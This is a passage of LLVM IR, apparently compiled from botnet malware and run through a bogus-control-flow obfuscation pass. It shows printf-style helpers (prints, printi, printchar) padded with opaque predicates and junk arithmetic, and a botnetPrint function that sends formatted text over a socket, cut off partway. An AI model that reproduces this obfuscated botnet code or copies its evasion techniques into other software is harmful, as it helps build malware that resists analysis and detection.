  %716 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i64 0, i64 1
  store i8 0, i8* %716, align 1
  %717 = load i8**, i8*** %12, align 8
  %718 = getelementptr inbounds [2 x i8], [2 x i8]* %18, i32 0, i32 0
  %719 = load i32, i32* %15, align 4
  %720 = load i32, i32* %16, align 4
  %721 = call i32 @prints(i8** %717, i8* %718, i32 %719, i32 %720)
  %722 = load i32, i32* %17, align 4
  %_89 = shl i32 %722, %721
  %_90 = sub i32 %722, %721
  %gen91 = mul i32 %_90, %721
  %_92 = shl i32 %722, %721
  %_93 = shl i32 %722, %721
  %723 = add nsw i32 %722, %721
  store i32 %723, i32* %17, align 4
  br label %originalBB88

originalBB97alteredBB:                            ; preds = %originalBB97, %578
  %724 = load i8**, i8*** %12, align 8
  %725 = load i8*, i8** %13, align 8
  %726 = load i8, i8* %725, align 1
  %727 = zext i8 %726 to i32
  call void @printchar(i8** %724, i32 %727)
  %728 = load i32, i32* %17, align 4
  %_98 = sub i32 0, %728
  %gen99 = add i32 %_98, 1
  %_100 = sub i32 0, %728
  %gen101 = add i32 %_100, 1
  %_102 = shl i32 %728, 1
  %_103 = sub i32 0, %728
  %gen104 = add i32 %_103, 1
  %_105 = sub i32 %728, 1
  %gen106 = mul i32 %_105, 1
  %_107 = shl i32 %728, 1
  %_108 = shl i32 %728, 1
  %_109 = shl i32 %728, 1
  %729 = add nsw i32 %728, 1
  store i32 %729, i32* %17, align 4
  br label %originalBB97

originalBB113alteredBB:                           ; preds = %originalBB113, %602
  %730 = load i8*, i8** %13, align 8
  %731 = getelementptr inbounds i8, i8* %730, i32 1
  store i8* %731, i8** %13, align 8
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %621
  %732 = load i8**, i8*** %12, align 8
  %733 = icmp ne i8** %732, null
  br label %originalBB117
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %74

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %48

; <label>:31:                                     ; preds = %27
  %32 = load i32, i32* @x.29
  %33 = load i32, i32* @y.30
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  store i32 0, i32* %7, align 4
  %40 = load i32, i32* @x.29
  %41 = load i32, i32* @y.30
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:48:                                     ; preds = %27
  %49 = load i32, i32* %11, align 4
  %50 = load i32, i32* %7, align 4
  %51 = sub nsw i32 %50, %49
  store i32 %51, i32* %7, align 4
  br label %52

; <label>:52:                                     ; preds = %48, %originalBBpart2
  %53 = load i32, i32* @x.29
  %54 = load i32, i32* @y.30
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i32, i32* %8, align 4
  %62 = and i32 %61, 2
  %63 = icmp ne i32 %62, 0
  %64 = load i32, i32* @x.29
  %65 = load i32, i32* @y.30
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %73

; <label>:72:                                     ; preds = %originalBBpart25
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %originalBBpart25
  br label %74

; <label>:74:                                     ; preds = %73, %4
  %75 = load i32, i32* %8, align 4
  %76 = and i32 %75, 1
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %123, label %78

; <label>:78:                                     ; preds = %74
  %79 = load i32, i32* @x.29
  %80 = load i32, i32* @y.30
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %78
  %87 = load i32, i32* @x.29
  %88 = load i32, i32* @y.30
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %95

; <label>:95:                                     ; preds = %119, %originalBBpart29
  %96 = load i32, i32* %7, align 4
  %97 = icmp sgt i32 %96, 0
  br i1 %97, label %98, label %122

; <label>:98:                                     ; preds = %95
  %99 = load i32, i32* @x.29
  %100 = load i32, i32* @y.30
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %98
  %107 = load i8**, i8*** %5, align 8
  %108 = load i32, i32* %10, align 4
  call void @printchar(i8** %107, i32 %108)
  %109 = load i32, i32* %9, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %9, align 4
  %111 = load i32, i32* @x.29
  %112 = load i32, i32* @y.30
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart214, label %originalBB11alteredBB

originalBBpart214:                                ; preds = %originalBB11
  br label %119

; <label>:119:                                    ; preds = %originalBBpart214
  %120 = load i32, i32* %7, align 4
  %121 = add nsw i32 %120, -1
  store i32 %121, i32* %7, align 4
  br label %95

; <label>:122:                                    ; preds = %95
  br label %123

; <label>:123:                                    ; preds = %122, %74
  br label %124

; <label>:124:                                    ; preds = %151, %123
  %125 = load i32, i32* @x.29
  %126 = load i32, i32* @y.30
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %124
  %133 = load i8*, i8** %6, align 8
  %134 = load i8, i8* %133, align 1
  %135 = icmp ne i8 %134, 0
  %136 = load i32, i32* @x.29
  %137 = load i32, i32* @y.30
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %135, label %144, label %154

; <label>:144:                                    ; preds = %originalBBpart218
  %145 = load i8**, i8*** %5, align 8
  %146 = load i8*, i8** %6, align 8
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  call void @printchar(i8** %145, i32 %148)
  %149 = load i32, i32* %9, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %9, align 4
  br label %151

; <label>:151:                                    ; preds = %144
  %152 = load i8*, i8** %6, align 8
  %153 = getelementptr inbounds i8, i8* %152, i32 1
  store i8* %153, i8** %6, align 8
  br label %124

; <label>:154:                                    ; preds = %originalBBpart218
  br label %155

; <label>:155:                                    ; preds = %originalBBpart236, %154
  %156 = load i32, i32* %7, align 4
  %157 = icmp sgt i32 %156, 0
  br i1 %157, label %158, label %182

; <label>:158:                                    ; preds = %155
  %159 = load i8**, i8*** %5, align 8
  %160 = load i32, i32* %10, align 4
  call void @printchar(i8** %159, i32 %160)
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %163

; <label>:163:                                    ; preds = %158
  %164 = load i32, i32* @x.29
  %165 = load i32, i32* @y.30
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %163
  %172 = load i32, i32* %7, align 4
  %173 = add nsw i32 %172, -1
  store i32 %173, i32* %7, align 4
  %174 = load i32, i32* @x.29
  %175 = load i32, i32* @y.30
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart236, label %originalBB20alteredBB

originalBBpart236:                                ; preds = %originalBB20
  br label %155

; <label>:182:                                    ; preds = %155
  %183 = load i32, i32* @x.29
  %184 = load i32, i32* @y.30
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %182
  %191 = load i32, i32* %9, align 4
  %192 = load i32, i32* @x.29
  %193 = load i32, i32* @y.30
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  ret i32 %191

originalBBalteredBB:                              ; preds = %originalBB, %31
  store i32 0, i32* %7, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %200 = load i32, i32* %8, align 4
  %_ = sub i32 %200, 2
  %gen = mul i32 %_, 2
  %_2 = shl i32 %200, 2
  %_3 = shl i32 %200, 2
  %201 = and i32 %200, 2
  %202 = icmp ne i32 %201, 0
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %78
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %98
  %203 = load i8**, i8*** %5, align 8
  %204 = load i32, i32* %10, align 4
  call void @printchar(i8** %203, i32 %204)
  %205 = load i32, i32* %9, align 4
  %_12 = shl i32 %205, 1
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %9, align 4
  br label %originalBB11

originalBB16alteredBB:                            ; preds = %originalBB16, %124
  %207 = load i8*, i8** %6, align 8
  %208 = load i8, i8* %207, align 1
  %209 = icmp ne i8 %208, 0
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %163
  %210 = load i32, i32* %7, align 4
  %_21 = sub i32 0, %210
  %gen22 = add i32 %_21, -1
  %_23 = sub i32 %210, -1
  %gen24 = mul i32 %_23, -1
  %_25 = sub i32 %210, -1
  %gen26 = mul i32 %_25, -1
  %_27 = sub i32 %210, -1
  %gen28 = mul i32 %_27, -1
  %_29 = sub i32 0, %210
  %gen30 = add i32 %_29, -1
  %_31 = sub i32 0, %210
  %gen32 = add i32 %_31, -1
  %_33 = sub i32 0, %210
  %gen34 = add i32 %_33, -1
  %211 = add nsw i32 %210, -1
  store i32 %211, i32* %7, align 4
  br label %originalBB20

originalBB38alteredBB:                            ; preds = %originalBB38, %182
  %212 = load i32, i32* %9, align 4
  br label %originalBB38
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* @x.31
  %35 = load i32, i32* @y.32
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.31
  %45 = load i32, i32* @y.32
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %77

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %11, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %77

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %10, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %77

; <label>:58:                                     ; preds = %55
  %59 = load i32, i32* @x.31
  %60 = load i32, i32* @y.32
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  store i32 1, i32* %19, align 4
  %67 = load i32, i32* %10, align 4
  %68 = sub nsw i32 0, %67
  store i32 %68, i32* %21, align 4
  %69 = load i32, i32* @x.31
  %70 = load i32, i32* @y.32
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart214, %55, %52, %originalBBpart2
  %78 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %79 = getelementptr inbounds i8, i8* %78, i64 12
  %80 = getelementptr inbounds i8, i8* %79, i64 -1
  store i8* %80, i8** %17, align 8
  %81 = load i8*, i8** %17, align 8
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %113, %77
  %83 = load i32, i32* %21, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %122

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* %21, align 4
  %87 = load i32, i32* %11, align 4
  %88 = urem i32 %86, %87
  store i32 %88, i32* %18, align 4
  %89 = load i32, i32* %18, align 4
  %90 = icmp sge i32 %89, 10
  br i1 %90, label %91, label %113

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* @x.31
  %93 = load i32, i32* @y.32
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %91
  %100 = load i32, i32* %15, align 4
  %101 = sub nsw i32 %100, 48
  %102 = sub nsw i32 %101, 10
  %103 = load i32, i32* %18, align 4
  %104 = add nsw i32 %103, %102
  store i32 %104, i32* %18, align 4
  %105 = load i32, i32* @x.31
  %106 = load i32, i32* @y.32
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart239, label %originalBB16alteredBB

originalBBpart239:                                ; preds = %originalBB16
  br label %113

; <label>:113:                                    ; preds = %originalBBpart239, %85
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, 48
  %116 = trunc i32 %115 to i8
  %117 = load i8*, i8** %17, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 -1
  store i8* %118, i8** %17, align 8
  store i8 %116, i8* %118, align 1
  %119 = load i32, i32* %11, align 4
  %120 = load i32, i32* %21, align 4
  %121 = udiv i32 %120, %119
  store i32 %121, i32* %21, align 4
  br label %82

; <label>:122:                                    ; preds = %82
  %123 = load i32, i32* %19, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %174

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %13, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %154

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* @x.31
  %130 = load i32, i32* @y.32
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %128
  %137 = load i32, i32* %14, align 4
  %138 = and i32 %137, 2
  %139 = icmp ne i32 %138, 0
  %140 = load i32, i32* @x.31
  %141 = load i32, i32* @y.32
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart249, label %originalBB41alteredBB

originalBBpart249:                                ; preds = %originalBB41
  br i1 %139, label %148, label %154

; <label>:148:                                    ; preds = %originalBBpart249
  %149 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %149, i32 45)
  %150 = load i32, i32* %20, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %20, align 4
  %152 = load i32, i32* %13, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %13, align 4
  br label %173

; <label>:154:                                    ; preds = %originalBBpart249, %125
  %155 = load i32, i32* @x.31
  %156 = load i32, i32* @y.32
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %154
  %163 = load i8*, i8** %17, align 8
  %164 = getelementptr inbounds i8, i8* %163, i32 -1
  store i8* %164, i8** %17, align 8
  store i8 45, i8* %164, align 1
  %165 = load i32, i32* @x.31
  %166 = load i32, i32* @y.32
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %173

; <label>:173:                                    ; preds = %originalBBpart253, %148
  br label %174

; <label>:174:                                    ; preds = %173, %122
  %175 = load i32, i32* @x.31
  %176 = load i32, i32* @y.32
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %174
  %183 = load i32, i32* %20, align 4
  %184 = load i8**, i8*** %9, align 8
  %185 = load i8*, i8** %17, align 8
  %186 = load i32, i32* %13, align 4
  %187 = load i32, i32* %14, align 4
  %188 = call i32 @prints(i8** %184, i8* %185, i32 %186, i32 %187)
  %189 = add nsw i32 %183, %188
  store i32 %189, i32* %8, align 4
  %190 = load i32, i32* @x.31
  %191 = load i32, i32* @y.32
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart262, label %originalBB55alteredBB

originalBBpart262:                                ; preds = %originalBB55
  br label %198

; <label>:198:                                    ; preds = %originalBBpart262, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %33
  %200 = load i32, i32* %12, align 4
  %201 = icmp ne i32 %200, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  store i32 1, i32* %19, align 4
  %202 = load i32, i32* %10, align 4
  %_ = sub i32 0, %202
  %gen = mul i32 %_, %202
  %_2 = shl i32 0, %202
  %_3 = shl i32 0, %202
  %_4 = sub i32 0, %202
  %gen5 = mul i32 %_4, %202
  %_6 = sub i32 0, 0
  %gen7 = add i32 %_6, %202
  %_8 = sub i32 0, 0
  %gen9 = add i32 %_8, %202
  %_10 = shl i32 0, %202
  %_11 = sub i32 0, %202
  %gen12 = mul i32 %_11, %202
  %203 = sub nsw i32 0, %202
  store i32 %203, i32* %21, align 4
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %91
  %204 = load i32, i32* %15, align 4
  %_17 = sub i32 %204, 48
  %gen18 = mul i32 %_17, 48
  %_19 = sub i32 0, %204
  %gen20 = add i32 %_19, 48
  %_21 = shl i32 %204, 48
  %_22 = shl i32 %204, 48
  %205 = sub nsw i32 %204, 48
  %_23 = sub i32 0, %205
  %gen24 = add i32 %_23, 10
  %_25 = shl i32 %205, 10
  %_26 = shl i32 %205, 10
  %_27 = sub i32 %205, 10
  %gen28 = mul i32 %_27, 10
  %_29 = shl i32 %205, 10
  %_30 = sub i32 0, %205
  %gen31 = add i32 %_30, 10
  %_32 = sub i32 0, %205
  %gen33 = add i32 %_32, 10
  %_34 = shl i32 %205, 10
  %206 = sub nsw i32 %205, 10
  %207 = load i32, i32* %18, align 4
  %_35 = sub i32 %207, %206
  %gen36 = mul i32 %_35, %206
  %_37 = shl i32 %207, %206
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %18, align 4
  br label %originalBB16

originalBB41alteredBB:                            ; preds = %originalBB41, %128
  %209 = load i32, i32* %14, align 4
  %_42 = sub i32 0, %209
  %gen43 = add i32 %_42, 2
  %_44 = sub i32 %209, 2
  %gen45 = mul i32 %_44, 2
  %_46 = sub i32 0, %209
  %gen47 = add i32 %_46, 2
  %210 = and i32 %209, 2
  %211 = icmp ne i32 %210, 0
  br label %originalBB41

originalBB51alteredBB:                            ; preds = %originalBB51, %154
  %212 = load i8*, i8** %17, align 8
  %213 = getelementptr inbounds i8, i8* %212, i32 -1
  store i8* %213, i8** %17, align 8
  store i8 45, i8* %213, align 1
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %174
  %214 = load i32, i32* %20, align 4
  %215 = load i8**, i8*** %9, align 8
  %216 = load i8*, i8** %17, align 8
  %217 = load i32, i32* %13, align 4
  %218 = load i32, i32* %14, align 4
  %219 = call i32 @prints(i8** %215, i8* %216, i32 %217, i32 %218)
  %_56 = shl i32 %214, %219
  %_57 = sub i32 %214, %219
  %gen58 = mul i32 %_57, %219
  %_59 = sub i32 0, %214
  %gen60 = add i32 %_59, %219
  %220 = add nsw i32 %214, %219
  store i32 %220, i32* %8, align 4
  br label %originalBB55
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.35
  %4 = load i32, i32* @y.36
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #3
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i32, i32* %11, align 4
  %32 = load i8*, i8** %14, align 8
  %33 = load i8*, i8** %14, align 8
  %34 = call i64 @strlen(i8* %33) #9
  %35 = call i64 @send(i32 %31, i8* %32, i64 %34, i32 16384)
